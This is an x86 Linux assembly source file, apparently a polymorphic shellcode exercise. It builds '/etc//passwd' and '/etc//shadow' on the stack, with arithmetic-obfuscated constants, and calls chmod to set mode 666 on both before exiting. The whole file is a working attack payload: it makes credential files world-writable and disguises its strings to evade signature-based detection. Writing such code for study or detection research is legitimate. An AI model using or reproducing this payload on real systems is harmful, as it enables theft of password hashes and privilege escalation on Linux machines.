;Name: poly_chmod_666.asm

global _start
section .text

_start:
        xor    eax,eax
        jmp    function 

invoke_chmod:
        mov    al, 0xf         ; mov 15 decimal in AL
        int    0x80
        xor    eax,eax
        ret

function: 
        mov    cx, 0x1b6       ; mov 666 octal in CX
        push   eax

        ; push   0x64777373      ; 'dwss'
        mov dword [esp -4], 0x64777373
        sub esp, 0x4

        ; push   0x61702f2f      ; 'ap//'
        mov edi, 0x72813f3f
        sub edi, 0x11111010
        push edi

        push   0x6374652f      ; 'cte/'
        mov    ebx, esp
        call invoke_chmod

        push   eax
        push   0x776f6461      ; 'woda'

        ; push   0x68732f2f      ; 'hs//'
        mov edi, 0x57621e1e
        add edi, 0x11111111
        push edi

        push   0x6374652f      ; 'cte/'
        mov    ebx, esp
        call invoke_chmod

        inc    eax
        int    0x80
